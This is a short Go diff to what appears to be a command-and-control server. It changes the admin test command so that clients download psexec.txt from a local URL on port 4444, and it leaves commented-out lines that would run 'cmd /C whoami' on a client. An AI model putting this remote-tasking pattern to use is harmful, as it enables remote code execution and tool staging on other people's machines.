@@ -70,15 +70,20 @@ func (s *Server) adminListClients(rw http.ResponseWriter, r *http.Request) {
 
 func (s *Server) adminAddTestCommand(rw http.ResponseWriter, r *http.Request) {
 	arguments := make(model.CmdArgument)
-	arguments["msg"] = "ooy!"
+	//arguments["executable"] = "cmd"
+	//arguments["arg1"] = "/C"
+	//arguments["arg2"] = "whoami"
+
+	arguments["remoteurl"] = "http://127.0.0.1:4444/psexec.txt"
+	arguments["destination"] = "psexec.txt"
+
 	response := make(model.CmdResponse)
-	command := model.NewCommand("test", "0", strconv.Itoa(rand.Int()), arguments, response)
+	command := model.NewCommand("filedownload", "0", strconv.Itoa(rand.Int()), arguments, response)
 	srvCmd := NewSrvCmd(command, STATE_RECORDED, SOURCE_SRV)
 	s.cmdDb.add(srvCmd)
 }
 
 func (s *Server) adminAddCommand(rw http.ResponseWriter, r *http.Request) {
-	//c := model.NewCommandTest("0", strconv.Itoa(rand.Int()), []string{"arg0", "arg1"}, "")
 	reqBody, err := ioutil.ReadAll(r.Body)
 	if err != nil {
 		log.Error("Could not read body")
